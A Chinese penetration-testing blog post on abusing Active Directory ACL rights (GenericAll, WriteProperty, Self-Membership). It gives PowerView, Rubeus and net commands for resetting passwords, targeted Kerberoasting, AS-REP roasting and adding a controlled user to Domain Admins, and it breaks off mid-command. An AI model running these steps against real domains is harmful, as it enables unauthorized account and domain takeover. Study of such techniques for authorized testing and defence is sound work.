---
title: 内网活动目录利用方法 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18616416
source: 博客园 - 渗透测试中心
date: 2024-12-20
fetch_date: 2025-10-06T19:38:13.922495
---

# 内网活动目录利用方法 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [内网活动目录利用方法](https://www.cnblogs.com/backlion/p/18616416 "发布于 2024-12-19 09:35")

#### 滥用活动目录ACLs\ACEs权限

<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse>

[https://www.cnblogs.com/nice0e3/p/15879624.html](https://www.cnblogs.com/nice0e3/p/15879624.html#self-membership)

DACL和ACE是与访问控制相关的概念，常用于操作系统和网络环境中。以下是对它们的详细解释：

1. DACL（Discretionary Access Control List）：DACL是一种访问控制列表，用于确定谁可以访问特定对象（如文件、文件夹、注册表项等）。DACL是以访问控制条目（ACE）的形式组成的列表。
2. ACE（Access Control Entry）：ACE是DACL中的基本单元，用于授予或拒绝对对象的访问权限。每个ACE定义了一个安全主体（如用户、组、计算机等）以及该安全主体所具有的权限。

在DACL中，每个ACE包含以下信息：

* 安全主体（SID）：标识被授权或被拒绝访问权限的用户、组或计算机的唯一标识符。
* 访问权限：表示特定操作或权限（如读取、写入、执行等）。
* 访问掩码：指定了实际授予或拒绝的权限。
* 辅助访问掩码：在某些情况下，用于指定其他条件或限制。

当访问对象时，系统将根据DACL中的ACE进行验证。如果存在与用户身份匹配的ACE，并且该ACE授予了所请求的权限，访问将被允许。如果没有匹配的ACE，或者存在与用户身份匹配的ACE，但是该ACE拒绝了所请求的权限，访问将被拒绝。

域管理员的ACE如下

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219093400652-1766635250.png)

其中，我们关注的权限为如下几条

* **GenericAll** - full rights to the object (add users to a group or reset user's password)
* **GenericWrite** - update object's attributes (i.e logon script)
* **WriteOwner** - change object owner to attacker controlled user take over the object
* **WriteDACL** - modify object's ACEs and give attacker full control right over the object
* **AllExtendedRights** - ability to add user to a group or reset password
* **ForceChangePassword** - ability to change user's password
* **Self (Self-Membership)** - ability to add yourself to a group
* GenericAll - 对对象拥有完全权限（例如添加用户到组或重置用户密码） 。
* GenericWrite - 更新对象的属性（例如登录脚本） 。
* WriteOwner - 修改对象的所有者为攻击者控制的用户，接管该对象 。
* WriteDACL - 修改对象的ACEs，并授予攻击者对该对象的全部控制权限 。
* AllExtendedRights - 能够添加用户到组或重置密码 。
* ForceChangePassword - 能够更改用户的密码 。
* Self（Self-Membership）- 能够将自己添加到组中。
* Self-Membership - 这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象），也就是说，某个对象在某个组中是Self-Membership身份。

##### GenericAll

###### 对用户账户的GenericAll权限

使用PowerView工具，查看用户的GenericAll权限。

> powershell -exec bypass
>
> Import-Module .\PowerView.ps1

//获取用户man1的AD对象的访问控制列表（ACL）,筛选返回具有"GenericAll"权限的项

> Get-ObjectAcl -SamAccountName man1 -ResolveGUIDs | ? {$\_.ActiveDirectoryRights -eq "GenericAll"}

可以看到spotless用户拥有对delegate的GenericAll权限，那么在已获得spotless用户权限的情况下，我们可以接管delegate用户。

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219093401861-325107743.png)

1. \*\*更改密码：\*\*直接修改delegate用户的密码即可。

> net user <username><password> /domain

1. \*\*Kerberoasting攻击：\*\*给delegate用户设置SPN，然后通过spotless用户的TGT来请求所有服务的ST，获取到delegate用户的HASH加密的ST，进行破解。

# Set SPN

> Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}

# Get Hash

> .\Rubeus.exe kerberoast /user:<username> /nowrap

# Clean SPN

> Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

<https://github.com/ShutdownRepo/targetedKerberoast>

> python3 targetedKerberoast.py -domain.local -u <username> -p password -v

1. \*\*ASREProast攻击：\*\*可以通过禁用预身份验证来使用户ASREPRoastable ，然后对其进行 ASREProast攻击。

> Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}

###### 对用户组的GenericAll权限

//获取到domain admins组的distinguishedName值

> Get-NetGroup "domain admins"

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219093402517-1423371163.png)

//获取Domain Admins组的ACL

> Get-ObjectAcl -ResolveGUIDs | ? {$\_.objectdn -eq " CN=Domain Admins,CN=Users,DC=vvvv1,DC=com"}

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219093403275-566187350.png)

发现spotless用户拥有对Domain Admins组的GenericAll权限，可以进行攻击。

将自己（用户spotless）或其他用户添加到Domain Admin组中。

> net group "domain admins" spotless /add /domain

也可以使用 Active Directory 或 PowerSploit 模块进行攻击。

# with active directory module

> Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit

> Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"

###### 对机器账户或服务账户的GenericAll权限

1. 如果对机器账户或服务账户具有GenericAll权限或者GenericWrite权限，可以考虑使用基于资源的约束委派攻击，详情见《内网横向移动-基于资源的约束委派》；
2. 对于服务账户也可以考虑上文中的对用户账户的攻击方法；
3. 或者使用Shadow Credentials进行攻击；

**影子凭证**

<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials>

<https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab>

<http://www.hackdig.com/02/hack-599160.htm>

<https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>

##### WriteProperty

###### 对用户组的WriteProperty权限

我们的受控用户对domain admins组有WriteProperty权限。

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219093403997-573575748.png)

可以将该用户添加进入domain admins组来提升权限。

> powershell -exec bypass
>
> Import-Module .\PowerView.ps1
>
> Add-NetGroupUser -UserName user -GroupName "domain admins" -Domain "vvvv1.com"

##### Self (Self-Membership)

###### 对用户组的Self (Self-Membership)权限

我们的受控用户对domain admins组有Self (Self-Membership)的权限。

![](https://img2023.cnblogs.com/blog/1049983/202412/1049983-20241219093404634-1768942844.png)

这个权限也是可以将用户添加进入组的权限，可以将该用户添加进入domain admins组来提升权限。

> powershell -exec bypass
>
> Import-Module .\PowerView.ps1
>
> Add-NetGroupUser -UserName user -GroupName "domain admins" -Domain "vvvv1.com"

"WriteProperty (Self-Membership)" 和 "Self (Self-Membership)" 都是与自成员（Self-Membership）相关的属性，但它们在含义上有所不同。

1. "WriteProperty (Self-Membership)": 这个属性表示对象能够写入（修改）自身的属性。通常情况下，对象只能修改其他对象的属性，而不能直接修改自己的属性。但当设置了"WriteProperty (Self-Membership)"属性时，对象就可以修改自己的属性。
2. "Self (Self-Membership)": 这个属性表示对象本身是其所在组或集合的成员。它与"WriteProperty (Self-Membership)"属性不同。"Self (Self-Membership)"属性表明对象本身是自己所在组或集合的一个成员，而"WriteProperty (Self-Membership)"属性则表明对象拥有修改自身属性的权限。

**总结：也就是说，如果对象类型不是ALL，而是Self-Membership，那么就代表，我们查询的这个用户对象是属于这个用户组的。 其中"WriteProperty (Self-Membership)"属性赋予对象修改自身属性的权限，也就可以将该对象加入组；而"Self (Self-Membership)"属性指示对象本身是其所在组或集合的成员，也可以将该对象加入组。**

##### WriteProperty (Self-Membership)

###### 对用户组的WriteProperty (Self-Membership)权限

我们的受控用户对domain admins组有WriteProperty (Self-Membership)的权限。

> Get-ObjectAcl -ResolveGUIDs | ? {$\_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $\_.Ident...